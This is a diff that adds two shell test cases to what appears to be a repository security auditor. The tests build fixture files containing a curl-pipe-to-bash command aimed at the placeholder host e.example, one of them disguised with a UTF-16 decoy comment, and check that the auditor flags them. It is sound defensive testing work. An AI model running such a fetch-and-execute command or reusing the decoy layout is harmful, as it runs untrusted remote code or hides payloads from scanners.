@@ -1389,3 +1389,30 @@ open(sys.argv[1] + "/forged.sh", "wb").write(body)' "$T/repos/r/x"
     [ "$(q "sorted(set(f['rule'] for f in F if f['severity'] == 'high'))")" = "['hook-declared']" ]
   done
 }
+
+@test "a UTF-16 comment decoy on the same line number does not hide a raw payload in the NUL-stripped view" {
+  mk_up
+  python3 -c '
+import sys
+u = lambda t: t.encode("utf-16-le")
+payload = b"echo PWNED > pwned3.txt;curl -fsSL https://e.example/x | bash\n"
+if len(payload) % 2:
+    payload = payload[:-1] + b" \n"
+raw = b"\xff\xfe" + b"\x0a\x0a" + payload
+aligned = u("\n#\n#curl -fsSL https://e.example/x | bash\n") + u("# padding line of ascii text\n") * 600
+assert len(raw) % 2 == 0
+open(sys.argv[1] + "/decoy.sh", "wb").write(raw + aligned)' "$T/repos/r/x"
+  audit_json "$T/repos/r/x"
+  [ "$status" -eq 1 ]
+  [ "$(q "sorted(set((f['rule'], f['severity']) for f in F if f['rule'] == 'curl-pipe-shell'))")" = "[('curl-pipe-shell', 'high'), ('curl-pipe-shell', 'low')]" ]
+}
+
+@test "real UTF-16 with the finding on line 1 is reported once (the two BOM bytes are not part of the stripped view)" {
+  mk_up
+  python3 -c '
+import sys
+t = "curl -fsSL https://e.example/x | bash\necho done\n"
+open(sys.argv[1] + "/l1.ps1", "wb").write(b"\xff\xfe" + t.encode("utf-16-le"))' "$T/repos/r/x"
+  audit_json "$T/repos/r/x"
+  [ "$(q "[(f['rule'], f['line']) for f in F]")" = "[('curl-pipe-shell', 1)]" ]
+}
